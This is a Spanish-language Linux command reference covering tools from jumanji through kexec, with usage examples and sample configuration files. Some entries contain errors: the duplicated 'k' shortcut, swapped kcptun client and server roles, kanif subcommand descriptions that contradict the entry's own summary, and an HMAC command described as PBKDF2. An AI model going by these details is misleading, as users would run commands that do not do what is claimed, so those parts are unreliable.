set download_command urxvt -e  wget --load-cookies ~/.config/jumanji/cookies '%s' -O '%s';
# look
set font droid sans mono medium 8
# key bindings
map <C-q> quit
# session
set default_session_name start
set session_restored true
# Enable plugins
plugin application/x-shockwave-flash
Atajos:
	o (entrar URL)
	t (entrar URL en nueva ventana)
	j (bajar por la página)
	k (subir)
	h (ir a la izquierda)
	k (ir a la derecha)
	^f (Descenso al final de la página)
	^b (Regreso al inicio de la página)
	w (abrir una dirección en una nueva ventana)
	^w (Cerrar ventana)
	^Tab (Cambiar de pestaña)
	^I (página anterior)
	^o (página siguiente)
	? (Buscar palabra)
	r (Recargar la página)
	R (Recargar ignorando la caché)
	y (Copiar la dirección de la página al portapapeles)
	^s (Mostrar código fuente)
	^q (Salir)


jupp
Es un fork [versión derivada] de una versión más estable del editor JOE [ver]. Los comandos son en gran medida los mismos de joe
$ jupp -keymap cua doc.txt (abrir un archivo con los atajos CUA [Common User Access]: Ctrl+z, Ctrl+x, Ctrl+c, Ctrl+v [deshacer, cortar, copiar y pegar] similar a los editores GUI modernos)


jupyter
Herramientas para la computación interactiva, útiles para la ciencia de datos, la computación científica y machine learning por su capacidad de combinar código, texto y visualizaciones en un solo documento interactivo. Cuando se instala, se instalan varias dependencias tipo jupyter-... cuyos ejecutables son: jupyter-bundlerextension, jupyter-console, jupyter-dejavu, jupyter-kernelspec, jupyter-nbextension, jupyter-serverextension, jupyter-execute, jupyter-migrate, jupyter-notebook, jupyter-troubleshoot, jupyter-kernel, jupyter-nbconvert, jupyter-run y jupyter-trust.
$ jupyter-notebook (lanza el entorno web de Jupyter Notebook donde sse puede crear, editar y ejecutar notebooks .ipynb)
$ jupyter-console --kernel=python3 (abre una consola interactiva)
$ jupyter-run notebook.ipynb (ejecuta un notebook)
$ jupyter-nbconvert --to html mi_notebook.ipynb (convierte notebooks a HTML [PDF, Marldown...])
$ jupyter-kernelspec list (listar kernels disponibles en el sistema)
$ jupyter-trust mi_notebook.ipynb (marca un notebook como confiable)
$ jupyter-dejavu notebook1.ipynb notebook2.ipynb (visualizar diferencias entre versiones de notebooks)
$ jupyter-nbextension list (listar extensiones del frontend del notebook)
$ jupyter-nbextension enable hinterland/main (habilitar una extensión)
$ jupyter-serverextension enable nombre_extension (activa extensiones del servidor de Jupyter)
$ jupyter-troubleshoot (verifica versiones, dependencias, errores)


k2pdfopt
Herramienta de línea de comandos que se utiliza para optimizar archivos PDF y DJVU para su visualización en dispositivos electrónicos como lectores de libros electrónicos [e-readers] y smartphones. También puede ser utilizado para manipular archivos PDF de varias maneras, incluyendo el recorte, redimensionamiento, y la aplicación de OCR [Optical Character Recognition - Reconocimiento Óptico de Caracteres].
$ k2pdfopt input.pdf output.pdf (convertirá el archivo input.pdf en un archivo optimizado output.pdf)
$ k2pdfopt input.pdf -dev kindle output.pdf (optimiza input.pdf para un dispositivo Kindle y guarda el resultado en output.pdf)
$ k2pdfopt input.pdf -x 0.5 -y 0.5 -w 700 -h 900 output.pdf (recortar y redimensionar un PDF. -x y -y especifican coordenadas de inicio del recorte, y -w y -h especifican ancho y altura del área recortada)
$ k2pdfopt input.pdf -ocrmode 1 output.pdf (aplica OCR al archivo input.pdf y guarda el resultado en output.pdf)
$ k2pdfopt input.djvu output.pdf (convierte un archivo DJVU a un PDF optimizado)
$ k2pdfopt input.pdf -dev s9 output.pdf (optimiza input.pdf para un smartphone)
$ k2pdfopt input.pdf -mode b+o output.pdf (crea un PDF de mapa de bits con una capa de OCR)
$ k2pdfopt input.pdf -ui- -x 0.1 -y 0.1 -w 600 -h 800 -ocrmode 1 -dev kindle -fc- black -bc- white -g- 1.5 -m- 10 output.pdf (muestra una interfaz de usuario para seleccionar el área de recorte, recorta el PDF desde las coordenadas (0.1, 0.1) con un ancho de 600 y una altura de 800, aplica OCR, optimiza para Kindle, establece el color de primer plano a negro y el color de fondo a blanco, ajusta el factor de escala de gris a 1.5, y establece un margen de 10.)


kacpimon
Herramienta que monitoriza los eventos ACPI [Advanced Configuration and Power Interface] del kernel y del teclado desde múltiples interfaces y los reporta a la consola. Las computadoras modernas son compatibles con la Interfaz de configuración y energía avanzada [ACPI] para permitir una gestión inteligente de la energía del sistema, el adaptador de corriente, el cierre de la tapa de un portátil, consultar el estado de la batería y la configuración.
# systemctl stop acpid (antes de ejecutar kacpimon es necesario detener el daemon acpid)
$ ps aux | grep acpid (verificar si acpid está corriendo)
# kacpimon (iniciará la monitorización de eventos ACPI y de teclado, mostrando en la consola cualquier evento detectado)
Nota.- Para salir, presionar Esc. Evitar Ctrl+C, ya que puede causar pérdida de datos.


kactivities-bin
Herramienta que forma parte del escritorio KDE y permite interactuar con el sistema de actividades de KDE Plasma.
$ kactivities-cli --list-activities (listar todas las actividades disponibles)
$ kactivities-cli --current-activity (obtener la actividad actual)
$ kactivities-cli --set-current-activity "ID_DE_ACTIVIDAD" (cambiar a una actividad específica)
$ kactivities-cli --add-activity "Nombre de la nueva actividad" (crear una nueva actividad)
$ kactivities-cli --remove-activity "ID_DE_ACTIVIDAD" (eliminar una actividad)


kactivitymanagerd
Servicio [daemon] del escritorio KDE plasma para gestionar las actividades del usuario, rastrear sus patrones de uso, etc. Aunque no es un comando que se utilice directamente en la terminal para realizar acciones específicas como otros comandos, su función es crucial para el funcionamiento de características relacionadas con la gestión de actividades y seguimiento de uso en KDE.


kakoune
Editor de código muy inspirado en Vim; por ello, la mayoría de sus comandos son similares a los de Vi y comparte el modelo de Vi de "pulsaciones de teclado como lenguaje de edición de texto". :q para salir.
$ kak file.txt


kanif
Herramienta para la gestión y administración de clústeres de computación de alto rendimiento. Combina las principales funcionalidades de herramientas de gestión de clústeres conocidas, como c3, pdsh y dsh, e imita su sintaxis. Ofrece tres herramientas para ejecutar el mismo comando en varios nodos ("ssh paralelo", mediante el comando 'kash'), para difundir la copia de archivos o directorios a varios nodos (comando 'kaput') y para recopilar varios archivos o directorios remotos localmente (comando 'kaget'). Incluye las herramientas kaget, kaput y kash
$ kanif -n "python --version" (ejecutar un comando en todos los nodos del clúster)
$ kaget (listar todos los nodos del clúster y su estado)
$ kaput -r nodo1 (reiniciará el nodo llamado nodo1)
$ kash -j "./analisis.sh" (enviar un trabajo a todos los nodos, por ejemplo un script de análisis)


kannel
es una puerta de enlace para conectar teléfonos WAP [Wireless Application Protocol - Protocolo de Aplicación Inalámbrica] a Internet. Permmite enviar y recibir mensajes SMS y MMS, así como para manejar conexiones **WAP** (Wireless Application Protocol). Está diseñado para operar entre una red GSM a través de SMPP, HTTP, o interfaces de módem y servicios de aplicaciones en Internet. También funciona como puerta de enlace SMS/SMPP para proporcionar servicios basados en SMS a teléfonos GSM. Incluye las aplicaciones decode_emimsg, mtbatch, seewbmp, wmlsc, wmlsdasm, bearerbox, run_kannel_box, smsbox y wapbox.
$ bearerbox -v 1 /etc/kannel/kannel.conf (inicia el "bearerbox" con nivel de verbosidad 1 usando el archivo de configuración)
$ smsbox -v 1 /etc/kannel/kannel.conf (inicia el proceso "smsbox", encargado de enviar y recibir SMS usando las reglas definidas en el archivo de configuración)
$ wapbox /etc/kannel/kannel.conf (módulo opcional para manejar tráfico WAP menos usado actualmente por la obsolescencia del WAP)
$ run_kannel_box bearerbox /etc/kannel/kannel.conf (wrapper/script para facilitar el inicio de los componentes de Kannel)
$ mtbatch -f lista.csv -u http://localhost:13013/cgi-bin/sendsms (herramienta para enviar mensajes SMS masivos)
Un ejemplo de lista.csv podría ser:
        972456789,Hola Juan
        910987654,Hola María
        ...
$ decode_emimsg 0201000D916407281553F800008005060804D4F29C0E (decodifica una cadena hexadecimal en un mensaje EMI/UCP [protocolo de mensajes SMS])
$ seewbmp imagen.wbmp (muestra imágenes WBMP [Wireless Bitmap], usadas en terminales WAP antiguos)
$ wmlsc archivo.wmls (genera archivo.wmlc, un archivo compilado de WMLScript)
$ wmlsdasm archivo.wmlc (imprime el código fuente o aproximado del archivo compilado .wmlc)
Estructura típica del archivo de configuración:
# nano /etc/kannel/kannel.conf
        group = core
        admin-port = 13000
        smsbox-port = 13001
        admin-password = bar
        log-file = "/var/log/kannel/bearerbox.log"
        log-level = 1
        #
        group = smsc
        smsc = fake
        smsc-id = FAKE
        port = 10000
        #
        group = sendsms-user
        username = tester
        password = foobar
        #
        group = sms-service
        keyword = default
        text = "Servicio no disponible"


kanshi
Permite definir perfiles de salida que se activan y desactivan automáticamente al conectar en caliente. Es especialmente útil si se conecta o desconecta monitores externos con frecuencia, o si se acopla y desacopla a una estación de trabajo varias veces.
$ nano .config/kanshi/config
        profile "solo-portatil" {
            output "eDP-1" enable
            output "DP-1" disable
        }
        profile "monitor-externo" {
            output "eDP-1" disable
            output "DP-1" enable
            output "DP-1" mode 1920x1080@60Hz
            output "DP-1" position 0,0
        }
profile "solo-portatil"
 - output "eDP-1" enable --> Habilita la pantalla interna del portátil, suponiendo que eDP-1 es su nombre.
 - output "DP-1" disable --> Deshabilita la pantalla externa, suponiendo que DP-1 es su nombre.
Este perfil se activaría cuando solo se detecta la pantalla del portátil. Kanshi empareja implícitamente los perfiles basándose en las salidas presentes. Si solo tienes eDP-1 conectado, buscará un perfil que haga referencia solo a eDP-1 o que tenga eDP-1 habilitado y otras salidas no conectadas deshabilitadas.
profile "monitor-externo"
 - output "eDP-1" disable --> Deshabilita la pantalla interna del portátil.
 - output "DP-1" enable --> Habilita la pantalla externa.
 - output "DP-1" mode 1920x1080@60Hz --> Establece la resolución y la frecuencia de actualización para la pantalla externa.
 - output "DP-1" position 0,0 --> Posiciona la pantalla externa en la esquina superior izquierda.
Este perfil se activaría cuando DP-1 está conectado. Kanshi priorizará este perfil porque define explícitamente una acción para el DP-1 recién conectado.
$ kanshi (ejecutarlo directamente aunque lo normal es que se ejecute en segundo plano cuando se inicia sesión de Wayland)
$ kanshi -d (mostrará qué perfiles está evaluando kanshi y por qué elige o no, uno en particular)
Nota.- Para detenerlo, es posible que se tenga que encontrar la ID de su proceso o con pkill kanshi.


kappanhang
Herramienta diseñada para conexión remota de canales de audio y un puerto serie a un servidor Icom RS-BA1. La aplicación está diseñada principalmente para conectarse al transceptor Icom IC-705, que cuenta con Wi-Fi integrado y un servidor RS-BA1
$ kappanhang -H 192.168.1.100 -p 50001 -C 50002 -A 50003 (dirección IP del IC-705, puerto del servidor RS-BA1, puerto local para redirigir los comandos CAT [Computer Aided Transceiver] y puerto local para el streaming de audio)
$ kappanhang -H 192.168.1.100 -v (muestra información detallada de la conexión)
$ kappanhang -c /ruta/a/config.conf (cargar una configuración guardada)


karma-tools
Utilidades básicas para interactuar con el reproductor de música Rio Karma. Incluye las herramientas chprop, karma_helper y riocp.
$ riocp -a ~/Música/cancion.mp3 (subir un archivo al Karma)
$ riocp -d <id_del_archivo> (eliminar un archivo del dispositivo)
$ chprop 1234 --title="Nueva Canción" --genre="Rock" (cambiar las propiedades como artista, álbum, título de los archivos en el Rio Karma con ID 1234)
Nota.- El Rio Karma debe estar conectado por USB y en modo de transferencia.


kas
[Konfigurator für Applikations-Systeme]. Herramienta de configuración para proyectos basados en Bitbake. kas utiliza un archivo de configuración del proyecto y se encarga de la fase de descarga y configuración. BitBake es el motor de construcción utilizado por el proyecto Yocto. Es similar a make pero está específicamente diseñado para la construcción de distribuciones Linux embebidas.
$ kas build archivo-kas.yml (construir un proyecto)
$ kas build --target machine-specific archivo-kas.yml (construir para una máquina específica)
$ kas shell archivo-kas.yml (ejecutar una shell en el entorno configurado)
$ kas build --target core-image-minimal archivo-kas.yml (construir solo una receta específica)
Ejemplo de archivo.yml
$ nano kas.yml
        header:
          version: 12
        machine: qemux86-64
        distro: poky
        repos:
          poky:
            url: git://git.yoctoproject.org/poky
            refspec: kirkstone
          meta-openembedded:
            url: git://git.openembedded.org/meta-openembedded
            refspec: kirkstone
          meta-example:
            url: https://github.com/example/meta-example
            refspec: master
            layers:
              meta-example-layer:
                conf: |
                  IMAGE_INSTALL:append = " example-package"


kati
Clon experimental de GNU make cuyo objetivo principal es acelerar la compilación incremental [cuando se recompila solo lo que ha cambiado, sin rehacerlo todo] de Android que convierte el archivo Makefile en un ejecutable o en un archivo .ninja, que luego se compila usando el comando ninja [ver ninja-build].
Un pequeño ejemplo de como funciona la herramienta:
$ mkdir projecto-kati
$ cd projecto-kati
$ nano linux.c
        #include <stdio.h>
        /* Prueba de kati */
        int main() {
            printf("¡Linux es un sistema genial!\n");
            return 0;
        }
$ nano Makefile
        all: linux
        linux: linux.c
                gcc -o linux linux.c
$ ls
        linux.c  Makefile
$ kati -f Makefile (crea el ejecutable)
$ ls
        linux  linux.c  Makefile
$ ./linux
        ¡Linux es un sistema genial!
$ kati -ninja -f Makefile (creará un build.ninja para compilarlo con la aplicación ninja)


katoolin
[git python]. Instalar las herramientas de kali linux. Descarga:
$ git clone https://github.com/LionSec/katoolin.git
$ cd katoolin
$ python katoolin.py (entrar en la aplicación. Permite entre otras cosas, agregar los repositorios de kali linux, crear un menú o actualizarlos)


kazam
Herramienta para capturas de pantalla y grabaciones de pantalla. Permite grabar vídeo de escritorio y múltiples transmisiones de audio simultáneamente, con control sobre los niveles de audio y la región de la pantalla que se captura.
$ kazam --test (genera una señal de video de prueba)
$ kazam --nosound --debug (no se grabará audio y mostrar información detallada)
$ kazam --fullscreen (captura de pantalla instantánea de toda la pantalla)
$ kazam --area (seleccionar un área de la pantalla para la captura)
$ kazam --select (seleccionar una ventana específica para la captura)
$ kazam --window (captura de pantalla de la ventana actualmente activa )
$ kazam --preferences (abre la ventana de preferencias)


kbd
Permite configurar la consola de Linux, cambiar la fuente, redimensionar las consolas virtuales en modo texto y reasignar el teclado. Incluye las herramientas dumpkeys [ver], fgconsole, kbd_mode, loadkeys [ver], openvt, setfont [ver], unicode_start, kbdrate, codepage, deallocvt, getkeycodes, kbdinfo, loadunimap, mapscrn, mk_modmap, psfaddtable, psfgettable, psfstriptable, psfxtable, resizecons, screendump, setkeycodes, setleds, setlogcons, setmetamode, setvtrgb, showconsolefont, showkey [ver], splitfont, unicode_stop, setvesablank y vcstime


kbdd
Demonio para sistemas X11 [no Wayland] que gestiona distribuciones de teclado por ventana lo que permite que cada ventana, terminal, navegador, editor, etc. recuerde su propio idioma del teclado.
Es útil si se usa varias distribuciones, por ejemplo: español, inglés y catalán, y no se quiere cambiar manualmente cada vez que se cambia de aplicación.
$ kbdd -n (ejecutar en modo nodaemon, primer plano)
Automatizar en la sesión
$ nano .xinitrc
kbdd &
Se puede observar si realmente recuerda por ventana haciendo lo siguiente:
Abrir dos terminales y en una ejecutar:
$ setxkbmap us
Y en la otra ejecuta:
$ setxkbmap es
Cambiar de una a otra y comprobar si se activa automáticamente la distribución que se entro en cada una.
$ pkill kbdd (parar el demonio)


kbdrate
Establece la tasa de repetición del teclado y el tiempo de retardo en las tty.
# kbdrate -d 200 -r 10 (establece retardo de 200 milisegundos y velocidad de repetición de 10 por segundo)


kbtin
es un cliente MUD [Multi-User Dungeons] de consola basado en el popular Tintin++. No se limita al Mudding y puede usarse para ejecutar programas locales basados en líneas, como Adventure, MySQL, Dpkg-BuildPackage o PiuParts.
$ kbtin (abre la interfaz interactiva)
> connect mud.ejemplo.org 4000 (conectar por el puerto y la url especificados)
> system ls -la (ejecutar un comando del sistema)
> system adventure (interactuar con Adventure)
> system mysql -u usuario -pbasedatos (trabajar con MySQL)
> system piuparts -d sid paquete.deb (usar con piuparts)
> help (ver todos los comandos)
> split (dividir la pantalla)
> session NAME (gestionar múltiples conexiones)


kcapi-tools
Utilidades que interactúan directamente con la API de cifrado del kernel de Linux [AF_ALG]. Esto significa que aprovechan las implementaciones criptográficas optimizadas y seguras que residen en el kernel, a menudo con soporte para hardware específico. Incluye las aplicaciones kcapi-dgst, kcapi-enc y kcapi-rng
$ kcapi-dgst -c sha512 -i test.txt --hex (usando el hash especificado del archivo test.txt y en formato hexadecimal. Por defecto binario)
$ echo "Hola mundo" | kcapi-dgst -c sha256 --hex (calcular el hash de una cadena)
$ echo "Datos secretos" | kcapi-dgst -c hmac(sha256) -p "MiContrasena" --hex (deriva una clave de 256 bits de la contraseña usando PBKDF2 con HMAC-SHA256 por defecto)
$ echo "Mensaje secreto" | kcapi-enc -c cbc(aes) -e -p "mi_clave_secreta" --hex (cifrar una cadena con AES en modo CBC y una contraseña)
$ kcapi-enc -c cbc(aes) -d -p "mi_clave_secreta" --salt 1234567890abcdef --iv fedcba9876543210 --hex (descifrar)
$ kcapi-enc -c gcm(aes) -e -i important.txt -o important.enc --hex --password "SuperSecreto" (cifrar un archivo con AES-GCM)
$ kcapi-enc -c gcm(aes) -d -i important.enc -o important.dec --hex --password "SuperSecreto" --salt <salt_hex> --iv <iv_hex> --tag <tag_hex> (descifrar)
$ kcapi-rng -b 16 --hex (generar 16 bytes aleatorios en formato hexadecimal)
$ kcapi-rng -b 32 > random_data.bin (generar 32 bytes aleatorios utilizando el RNG estándar del kernel y escribirlo en un archivo binario)
$ kcapi-rng -b 64 -n stdrng -s archivo.txt --hex (generar 64 bytes aleatorios y sembrar el generador)
        CONFIG_CRYPTO_USER=m (o y)
        CONFIG_CRYPTO_USER_API=y
        CONFIG_CRYPTO_USER_API_HASH=y
        CONFIG_CRYPTO_USER_API_SKCIPHER=y
        CONFIG_CRYPTO_USER_API_RNG=y
        CONFIG_CRYPTO_USER_API_AEAD=y
Nota.- Para que kcapi-tools funcione, el kernel debe estar compilado con las opciones de configuración adecuadas para la API de cifrado del usuario. Algunas de las opciones clave incluyen:
Verificar estas configuraciones en el sistema con
$ cat /boot/config-$(uname -r) | grep CONFIG_CRYPTO_USER


kcat
Herramienta que permite interactuar con Apache Kafka. Es útil para producir y consumir mensajes en Kafka sin necesidad de escribir código en Java o cualquier otro lenguaje de programación.
En el modo productor, kcat lee mensajes de la entrada estándar [stdin] y los envía a un tema de Kafka.
$ cat mensajes.txt | kcat -b localhost:9092 -t mi_tema -P (archivo de mensajes a uno por linea que se quiere enviar, broker de Kafka al que conectar, tema y modo productor)
$ echo "Hola, Kafka!" | kcat -b localhost:9092 -t mi_tema -P (un solo mensaje a enviar)
$ echo "mensaje1|mensaje2|mensaje3" | kcat -b localhost:9092 -t mi_tema -P -D '|' (usando el delimitador "|")
$ echo "Mensaje para la partición 0" | kcat -b localhost:9092 -t mi_tema -P -p 0 (mensaje solo para la partición 0)
En el modo consumidor, kcat lee mensajes de un tema de Kafka y los imprime en la salida estándar [stdout].
$ kcat -b localhost:9092 -t mi_tema -C -G mi_grupo (-C indica modo consumidor)
$ kcat -b localhost:9092 -t mi_tema -C -p 0 (lectura desde la partición 0 del tema)


kcptun
Herramienta de reenvío de puertos remotos que convierte el flujo TCP en flujo UDP basado en el protocolo KCP para lograr un mayor rendimiento o una menor latencia. KCP es un protocolo de transmisión confiable sobre UDP que intenta superar las limitaciones de TCP, como la congestión o la retransmisión lenta. Se compone de dos programas kcptun-client [el servidor] y kcptun-server [el cliente]
En el servidor:
$ kcptun-client -t "127.0.0.1:1080" -l ":29900" --key "clave_segura" --crypt aes (dónde reenviar el tráfico recibido, puerto UDP de escucha kcptun, clave cifrada compartida y algoritmo de cifrado [aes, salsa20, none...])
En el cliente:
$ kcptun-server -r "1.2.3.4:29900" -l ":1080" --key "clave_segura" --crypt aes (IP y puerto del servidor remoto, puerto local en donde el cliente escuchará conexiones y la clave [la misma que el servidor])
Nota.- KCP solo cifra el canal, no cifra el contenido que puede que ya lo esté.


kdc2tiff
Convierte archivos KDC creados por cámaras digitales Kodak DC-120 [no soporta DC40/50] a TIFF o JPEG.
$ kdc2tiff imagen.kdc imagen.tiff (uso básico para conservar la máxima calidad de la imagen)
$ kdc2tiff vacaciones.kdc vacaciones.jpeg (convertir un archivo KDC a JPEG)


kde-cli-tools
Herramientas que permiten usar servicios de KDE como kioslaves, kdesu, QtSVG, módulos kcontrol y KDE Trader, e iniciar aplicaciones desde la línea de comandos. Este paquete forma parte de KDE Plasma. Incluye las herramientas kbroadcastnotification, kcmshell5, kde-inhibit, kde-open, kde-open5, kdecp, kdecp5, kdemv, kdemv5, keditfiletype, keditfiletype5, kinfo, kioclient, kioclient5, kmimetypefinder, kmimetypefinder5, kstart, kstart5, ksvgtopng, ksvgtopng5, ktraderclient5 y plasma-open-settings.
$ kde-open documento.pdf (abre el PDF con Okular la predeterminada de KDE)
$ kde-open https://kde.org (abre el sitio web en elu navegador predeterminado)
$ kcmshell5 keyboard (configuración del teclado)
$ kcmshell5 kcm_regionandlang (configuración de idioma)
$ kcmshell5 kcm_fonts (tipografías)
$ kcmshell5 kcm_lookandfeel (apariencia del sistema)
$ kcmshell5 --list (ver una lista completa de módulos disponibles)
$ kde-inhibit mpv peli.mp4 (inhibe temporalmente el bloqueo de pantalla o evita que se apague la pantalla mientras se reproduce el vídeo)
$ kdecp /home/pep/foto.jpg sftp://pep@servidor.local/home/pep/ (copia la foto a un servidor remoto vía SFTP)


kded
[KDE Daemon]. Es un demonio que KDE Plasma usa para hacer funcionar pequeños servicios necesarios en la sesión gráfica. Realiza diversas tareas menores como detectar cuando se inserta un USB, gestión del portapapeles, recordar configuración de brillo, que los iconos funcionen bien...
$ qdbus org.kde.kded5 /kded org.kde.kded5.loadedModules (ver los módulos cargados)
$ qdbus org.kde.kded5 /kded org.kde.kded5.loadedModules | wc -l (ver cuáles están activos)


kdialog
kdialog permite mostrar cuadros de diálogo desde scripts de shell. Su sintaxis está muy inspirada en el comando "dialog" (que muestra diálogos en modo texto).
$ kdialog --yesno ¿linux? (muestra un cuadro de dialogo con el texto y las opciones si y no)
$ kdialog --yesnocancel ¿linux? (lo mismo más la opción cancelar)
$ kdialog --warningcontinuecancel ¿linux? (peligro y botones continuar cancelar)
$ kdialog --password "Entrar la contraseña:" (pedir contraseña)
$ kdialog --msgbox "Contraseña correcta.\n A punto de conectarse al servidor" (cuadro informativo)
$ kdialog --sorry "Contraseña incorrecta.\n No se conectará al servidor"
$ kdialog --title "Esta es una ventana emergente pasiva." --passivepopup "Desaparecerá en 5 segundos". 5 (con título y que se cierre en 5 segundos)
$ kdialog --title "Dialogo de entrada" --inputbox "¿Qué nombre te gustaría usar?" (con título y espacio para entrar texto)
$ kdialog --textbox text.txt 512 256 (un archivo de texto con una medidas determinadas)
$ kdialog --checklist "Elegir un Sistema Operativo:" 1 "Red Hat" off 2 Debian on 3 Opensuse off (elegir opciones, marcando por defecto la 2ª)
$ kdialog --combobox "Seleccionar sistema:" "Red Hat" "Debian" "Opensuse" "Ubuntu" (con un menú desplegable)
$ kdialog --slider "Seleccionar volumen" 0 100 10 (con barra horizontal para seleccionar)
$ kdialog --getopenfilename /home/pep/Vídeos/ '*.mp4' (abrir un directorio con los mp4 para selecionar)
$ kdialog --getopenfilename /home/pep/Vídeos/ '*.mp4 *.avi' (con los .mp4 y los .avi


kdump
Se configura para cargar un segundo kernel [el "kernel de volcado"] en una parte reservada de la memoria. Si el primer kernel, el kernel principal, sufre un panic, kdump utiliza kexec para arrancar el kernel de volcado. La configuración se hace editando:
# nano /etc/default/grub
Y modificar la linea:
        GRUB_CMDLINE_LINUX_DEFAULT="quiet splash crashkernel=auto"
# update-grub (actualizar la configuración de GRUB)
Y en la configuración de kdump especificar una ruta para el volcado:
# nano /etc/kdump.conf
...
path /var/crash
...
# systemctl enable kdump (habilitar el inicio del servicio)
Cuando el sistema se bloquea, el kernel de volcado arrancará vía kexec y guardará la imagen en /var/crash.


kernel
1.-
Suprimir kernels antiguos
# uname -r   (para conocer el último)
# dpkg --get-selections | egrep linux-image
linux-image-2.6.17-11-generic install
linux-image-2.6.20-15-generic install
linux-image-2.6.20-16-generic install
Dejar el actual y suprimir los otros:
# apt-get remove --purge linux-image-2.6.17-11-generic
2.-
Instalar nuevo kernel:
Para el ejemplo descargaremos el kernel 3.3.6 para la versión de ubuntu 12.04 [http://kernel.ubuntu.com/~kernel-ppa/mainline/v3.3.6-precise/] para la arquitectura amd64. De los varios archivos que encontramos en la página, para lo que nos ocupa, solo interesan los linux-headers y linux-image.
$ wget http://kernel.ubuntu.com/~kernel-ppa/mainline/v3.3.6-precise/linux-headers-3.3.6-030306_3.3.6-030306.201205121335_all.deb
$ wget http://kernel.ubuntu.com/~kernel-ppa/mainline/v3.3.6-precise/linux-headers-3.3.6-030306-generic_3.3.6-030306.201205121335_amd64.deb
$ wget http://kernel.ubuntu.com/~kernel-ppa/mainline/v3.3.6-precise/linux-image-3.3.6-030306-generic_3.3.6-030306.201205121335_amd64.deb
La instalación se realiza en el mismo orden de descarga:
# gdebi linux-headers-3.3.6-030306_3.3.6-030306.201205121335_all.deb
# gedbi linux-headers-3.3.6-030306-generic_3.3.6-030306.201205121335_amd64.deb
# gedbi linux-image-3.3.6-030306-generic_3.3.6-030306.201205121335_amd64.deb
Después de la instalación del kernel, instalar los drivers privativos tipo nvidia o ati. Y actualizar grub:
# update-grub
3.-
[libncurses5 libncurses5-dev]
Compilar el kernel desde el codigo fuente. Puede ser util para habilitar soporte para algun nuevo periferico no soportado por el kernel por defecto. Escoger la ultima version del nucleo estable de kernel.org. Para el ejemplo usaremos la 3.9.11.
# cd /usr/src
# wget https://www.kernel.org/pub/linux/kernel/v3.x/linux-3.9.11.tar.gz
# tar -zxvf linux-3.9.11.tar.gz
# cd linux-3.9.11
# make menuconfig/
Mostrara las opciones de configuracion por defecto que podran ser modificadas para nuestra maquina especifica. Una vez terminado, "guardar" como .config
# make (Compilar)
# make modules_install (Instalar los modulos)
# make install (Instalar el nuevo kernel en el sistema)
La instalacion ya modifica el grub.cfg para que el sistema arranque con el nuevo kernel. Si este da problemas puede escogerse para el arranque el antiguo que constara en el menu de Grub. Puede verificarse el nuevo kernel con:
$ uname -r
4.-
Borrar kernels antiguos de forma automática:
	# apt-get purge $(dpkg -l 'linux-*' | sed '/^ii/!d;/'"$(uname -r | sed "s/\(.*\)-\([^0-9]\+\)/\1/")"'/d;s/^[^ ]* [^ ]* \([^ ]*\).*/\1/;/[0-9]/!d' | head -n -1) --assume-yes


kernel-install
Se usa para instalar o eliminar imágenes del kernel en initrd hacia y desde la partición del cargador de arranque, denominado $BOOT. Por lo general, será /boot/, /efi/ o /boot/efi/. Kernel-Install ejecutará los archivos ejecutables [plugins] ubicados en el directorio /usr/lib/kernel/install.d/ y el directorio de administración local /etc/kernel/install.d/. Todos los archivos se clasifican y ejecutan colectivamente en orden léxico, independientemente del directorio en el que esten. Los archivos de /etc/kernel/install.d/ tienen prioridad sobre archivos con el mismo nombre en /usr/lib/kernel/install.d/. Esto se puede usar para anular un sistema suministrado con un archivo local si es necesario, con un enlace simbólico en /etc/kernel/install.d/ con el mismo nombre que un ejecutable de /usr/lib/kernel/install.d/, señalando a /dev/null, deshabilita completamente el ejecutable. Los ejecutables deben tener la extensión ".install"; Se ignoran otras extensiones. Un ejecutable colocado en estos directorios debería devolver 0 en caso de éxito. También puede devolver 77 para provocar que finalice toda la operación (se omitirán los ejecutables posteriores en orden léxico). Para ver versiones del kernel instaladas:
$ ls /usr/lib/modules/


kerneltop
muestra el uso del kernel en estilo interactivo como top [ver]
# kerneltop -l 45 -s 5 (Que muestre 45 lineas [por defecto 50] y actualización cada 5 segundos [por defecto 1])


kesty-whatsapp
Aplicación de whatsapp para pc. La instalación es via snap [ver] y los comandos que se aplican a kesty-whatsapp son los genericos de snap, por tanto lo primero es instalar snap:
$ apt install snapd
$ snap install kesty-whatsapp
$ snap run kesty-whatsapp (arrancar kesty-whatsapp. Pide ingresar el código QT en el móvil para activar la aplicación)


hexcurse
es un versátil editor hexadecimal basado en Ncurses, escrito en C, que permite abrir, modificar y guardar archivos binarios o de texto mostrando su contenido tanto en formato hexadecimal como ASCII. Actualmente, admite editar archivos binarios, búsquedas, saltar a posiciones especificas y modificar bytes individuales.
$ hexcurse ejemplo.bin (abrir un archivo en modo interactivo)
$ hexcurse -a ejemplo.bin (mostrar direcciones en decimal)
$ hexcurse -r 8 ejemplo.bin (limitar a 8 caracteres por línea en la visualización)
Algunos atajos del modo interactivo:
        F1 / Ctrl+? --> Ayuda de teclas
        F2 / Ctrl+S --> Guardar archivo
        F3 / Ctrl+O --> Abrir archivo
        F4 / Ctrl+G --> Ir a dirección específica
        F5 / Ctrl+F --> Buscar cadena o valor hexadecimal
        F6 / Ctrl+A --> Cambiar entre direcciones hex/decimal
        F7 / TAB --> Alternar edición entre hexadecimal y ASCII
        F8 / Ctrl+Q --> Salir
        Ctrl+Z --> Deshacer último cambio
        Ctrl+U/D --> Página arriba/abajo
        Ctrl+T/B --> Ir al inicio/final del archivo


kexec
Es una llamada al sistema que permite arrancar un nuevo kernel desde el kernel actualmente en ejecución, sin necesidad de un reinicio completo del sistema, es decir, sin pasar por la BIOS/UEFI.
Reiniciar a un nuevo kernel de forma rápida:
Se ha actualizado el kernel a una nueva versión, por ejemplo, /boot/vmlinuz-6.1.0-9-amd64 con su initrd correspondiente /boot/initrd.img-6.1.0-9-amd64.
# kexec -l /boot/vmlinuz-6.1.0-9-amd64 --initrd=/boot/initrd.img-6.1.0-9-amd64 --append="$(cat /proc/cmdline)" (cargar el nuevo kernel)
        -l --> Le dice a kexec que cargue el kernel.
        /boot/vmlinuz-6.1.0-9-amd64 --> Ruta al archivo del nuevo kernel.
        --initrd=/boot/initrd.img-6.1.0-9-amd64 --> Ruta al archivo del initrd para el nuevo kernel.
        --append="$(cat /proc/cmdline)" --> Le pasa la línea de comandos actual del kernel al nuevo kernel.
Nota.- Es la forma más segura de asegurar que el nuevo kernel arranque con los mismos parámetros que el anterior [dónde está la raíz del sistema de archivos, parámetros de dispositivos, etc.].
# kexec -e (reiniciará el sistema usando el nuevo kernel sin pasar por el proceso completo de la BIOS/UEFI)
# systemctl kexec (integrar con el proceso de apagado)
